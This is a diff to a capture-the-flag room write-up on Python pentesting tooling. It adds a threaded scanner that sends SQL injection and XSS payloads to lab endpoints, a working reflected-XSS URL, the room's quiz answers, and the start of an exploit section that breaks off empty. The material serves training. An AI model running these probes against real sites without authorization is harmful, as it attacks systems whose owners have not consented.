@@ -12,6 +12,8 @@ While we will showcase using Python in this room, the principles can be applied 
 
 Add `MACHINE_IP` to your hosts `/etc/hosts` file with the command `echo "MACHINE_IP python.thm" | sudo tee -a /etc/hosts`
 
+<img width="286" height="35" alt="image" src="https://github.com/user-attachments/assets/f3a707cf-6daf-4b8d-b1b1-cca71462512f" />
+
 We will be using the web application running on this machine in the upcoming tasks.
 
 ## Using a Coding Language for Custom Tooling
@@ -184,6 +186,207 @@ brute_force()
 Run this code to get the right credentials and then use these credentials to get the flag.
 
 <img width="214" height="104" alt="image" src="https://github.com/user-attachments/assets/1513d9f6-822c-4375-9552-dfb989538858" />
+
+## Developing a Vulnerability Scanner
+
+Now that we have explored how Python can automate brute-force attacks, let's move on to another important aspect of web security testing, which is vulnerability scanning. Web apps contain various flaws that can be exploited to gain unauthorised access, extract sensitive information, or even gain RCE. 
+
+In this task, we will create a web scanner that will try one server-side vulnerability, SQLi and one client-side vulnerability, XSS.  
+
+### Essential Commands
+Before we start coding, let's cover some important Python libraries/commands that we will use:
+- **Regular expressions (re)**: The `re` library in Python is used for pattern matching within responses. We can use regex to identify and match the content response against a set of error messages.
+- **Threading**: Running scans sequentially is slow, so we use multi-threading to send multiple requests simultaneously, making our scanner faster and more efficient.
+
+### Practical
+
+Now, we will write code to prepare our vulnerability scanner, but first visit the page `http://python.thm/labs/lab2/greetings.php?id=2`, which would show a greeting message based on user ID as shown below: 
+
+<img width="580" height="363" alt="image" src="https://github.com/user-attachments/assets/90daf046-d71e-4c0d-8468-0ba3a40ed42d" />
+
+For SQLi, our logic is simple; we will try different payloads, such as `'`, `UNION SELECT 1,2,3 --`, `--`, etc., and then check the response for error messages like "SQL syntax error", "Unknown column", or "MySQL server error". If any of these errors appear, it indicates a potential SQL injection vulnerability.
+
+Similarly, for XSS, we will inject payloads like `<script>alert("Hacked")</script>` and check if the same payload is reflected in the response without being sanitised. The application may be vulnerable to XSS attacks if it appears as is.
+
+Now, we will write a simple Python script to scan the web application. In the AttackBox, create a new script `scanner.py` and copy the following code:
+
+```
+import requests
+import re
+import threading
+
+url = "http://python.thm/labs/lab2/greetings.php?id="
+
+payloads = {
+    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
+    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
+}
+
+sqli_errors = [
+    "SQL syntax","SQLite3::query():", "MySQL server", "syntax error", "Unclosed quotation mark", "near 'SELECT'",
+    "Unknown column", "Warning: mysql_fetch", "Fatal error"
+]
+
+def scan_payload(vuln_type, payload):
+    response = requests.get(url, params={"id": payload})
+    content = response.text.lower()
+
+    if vuln_type == "SQLi" and any(error.lower() in content for error in sqli_errors):
+        print(f"[+] Potential SQL injection detected with payload: {payload}")
+
+    elif vuln_type == "XSS" and payload.lower() in content:
+        print(f"[+] Potential XSS detected with payload: {payload}")
+
+threads = []
+for vuln, tests in payloads.items():
+    for payload in tests:
+        t = threading.Thread(target=scan_payload, args=(vuln, payload))
+        threads.append(t)
+        t.start()
+
+# Wait for all threads to finish
+for t in threads:
+    t.join()
+```
+
+### Key Areas in the Code 
+- **Target URL**: The script sends `GET` requests to the web application, trying different inputs against the `id` parameter. The target URL is dynamically updated with different payloads using `params={"id": payload}` to check if the application processes input securely.
+- **Defining payloads**: The script contains predefined payloads specifically designed to test for SQL injection and XSS vulnerabilities. SQL injection payloads attempt to manipulate database queries with inputs like `' OR '1'='1`, while XSS payloads insert JS such as `<script>alert('XSS')</script>` to check if it gets executed in the browser. 
+- **Detecting vulnerabilities**: The scanner sends payloads to the application and examines the response for common database error messages. If the response contains phrases like "SQL syntax error", "Unknown column", or "MySQL server error", it indicates that the application is processing user input directly in SQL queries without proper validation. Similarly, the application is vulnerable to XSS if the payload is reflected in the page without escaping or encoding. 
+- **Executing scans with multi-threading**: As a pentester, it is important to scan the website efficiently by speeding up the vulnerability scanning process. In this script, we are using multi-threading with `threading.Thread` to test multiple payload tests simultaneously. Instead of executing each payload one by one, threads allow numerous requests to be sent simultaneously, significantly reducing the scanning time.
+
+### Executing the Script
+
+Navigate to the terminal and execute the command `python3 scanner.py`. Upon execution, the script will try all the possible payloads and display whether it finds any SQL injection or XSS at the specified endpoint. 
+
+<img width="369" height="35" alt="image" src="https://github.com/user-attachments/assets/6ef93824-0538-4b91-8e9d-5b901854704c" />
+
+After executing the above code against the endpoint, we see that it finds two XSS vulnerabilities. Now, we can check if it is a false positive by manually using any of the above payloads and replacing it with the id parameter on our web app to execute the XSS attack. 
+
+In this case, the vulnerable URL will be `http://python.thm/labs/lab2/greetings.php?id=%3Cscript%3Ealert(%27Hacked%27)%3C/script%3E`
+
+A false positive is when a security scanner or tool reports a vulnerability — here, an XSS — but that report is incorrect
+
+After executing the above payload, we will see a pop-up reflecting the injected payload, showing that the site is vulnerable to XSS. 
+
+<img width="578" height="286" alt="image" src="https://github.com/user-attachments/assets/dd20ecd5-5ac4-4d80-9e31-765fe0db3543" />
+
+To answer the following questions, consider the endpoint `http://python.thm/labs/lab2/departments.php?name=` that accepts the name as an input parameter and shows the relevant department, as shown below:
+
+<img width="614" height="353" alt="image" src="https://github.com/user-attachments/assets/5d7c5e61-c0b1-4dbd-aafc-7d45b0abdf16" />
+
+### Answer the questions below
+
+1. How many vulnerabilities will be identified if we use the above `scanner.py` script with the updated URL `http://python.thm/labs/lab2/departments.php?name=`? (without changing the original code)
+
+0
+
+Update the `url` with `http://python.thm/labs/lab2/departments.php?name=` in `scanner.py` and execute the script
+
+<img width="213" height="17" alt="image" src="https://github.com/user-attachments/assets/efa5587d-723a-4924-9154-1f2c59c59907" />
+
+2. After tweaking the above script to use the appropriate `GET` parameter, how many payloads are found? (with changing the original code)
+
+2
+
+Updating the original code with the `name` parameter
+
+```
+#!/usr/bin/env python3
+import requests
+import threading
+
+# Target (updated)
+BASE = "http://python.thm/labs/lab2/departments.php"
+PARAM = "name"
+TIMEOUT = 8
+
+payloads = {
+    "SQLi": ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; --", "' UNION SELECT 1,2,3 --"],
+    "XSS": ["<script>alert('XSS')</script>", "'><img src=x onerror=alert('XSS')>"]
+}
+
+sqli_errors = [
+    "sql syntax","sqlite3::query():", "mysql server", "syntax error", "unclosed quotation mark",
+    "near 'select'","unknown column","warning: mysql_fetch","fatal error","sql error"
+]
+
+found = []   # store positive hits (thread-safe append via GIL is OK for simple use)
+
+def scan_payload(vuln_type, payload):
+    try:
+        r = requests.get(BASE, params={PARAM: payload}, timeout=TIMEOUT)
+        text = (r.text or "").lower()
+    except Exception as e:
+        print(f"[!] Request error for payload {payload!r}: {e}")
+        return
+
+    if vuln_type == "SQLi":
+        if any(err in text for err in sqli_errors):
+            print(f"[+] Potential SQLi detected with payload: {payload!r}")
+            found.append((vuln_type, payload))
+    elif vuln_type == "XSS":
+        # simple reflected check: payload appears verbatim (not exhaustive)
+        if payload.lower() in text:
+            print(f"[+] Potential XSS detected with payload: {payload!r}")
+            found.append((vuln_type, payload))
+
+threads = []
+for vuln, tests in payloads.items():
+    for payload in tests:
+        t = threading.Thread(target=scan_payload, args=(vuln, payload))
+        t.start()
+        threads.append(t)
+
+for t in threads:
+    t.join()
+
+# summary
+print("\n=== SUMMARY ===")
+total_tested = sum(len(v) for v in payloads.values())
+print(f"Total payloads tested: {total_tested}")
+print(f"Total positive findings: {len(found)}")
+if found:
+    for i, (vt, p) in enumerate(found, 1):
+        print(f"{i}. {vt} — {p!r}")
+```
+
+<img width="337" height="91" alt="image" src="https://github.com/user-attachments/assets/75ca67d1-9e90-4523-a807-0c36389f470f" />
+
+3. Which of the following is the valid type of vulnerability? Write the correct option only.
+
+a) CSRF
+b) SQL injection
+c) Prototype Pollution
+d) XSS
+
+b
+
+4. What is the name of the renowned library that is used to make concurrent requests to an endpoint?
+
+Threading
+
+## Creating a Basic Exploit
+
+### Exploit Development Using Python
+
+Python is one of the most widely used languages for exploit development due to its flexibility and powerful libraries. Python is often used to automate exploitation tasks such as:
+- Identifying and exploiting injection vulnerabilities (e.g.,  SQLi, SSTI)
+- Exploiting Remote Code Execution (RCE)
+- Automating post-exploitation (e.g., reverse shells, privilege escalation)
+
+Once an RCE vulnerability is identified, we can execute various commands for reconnaissance, privilege escalation, and lateral movement.
+
+Here are common commands used on Linux and Windows targets:
+
+
+
+
+
+
+
+
+
 
 
 
